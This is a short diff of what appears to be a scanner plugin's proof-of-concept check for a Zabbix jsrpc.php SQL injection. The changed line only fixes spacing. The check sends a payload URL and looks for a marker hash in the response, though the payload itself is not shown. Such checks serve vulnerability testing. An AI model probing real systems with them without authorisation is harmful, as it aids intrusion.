@@ -17,7 +17,7 @@ def poc(arg, **kwargs):
     vulnurl = arg + payload
     hack = HackRequests.hackRequests()
     try:
-        hh = hack.http(vulnurl,headers=headers)
+        hh = hack.http(vulnurl, headers=headers)
         if r"81dc9bdb52d04dc20036dbd8313ed055" in hh.text():
             result = {
                 "name": "zabbix jsrpc.php SQL注入",  # 插件名称
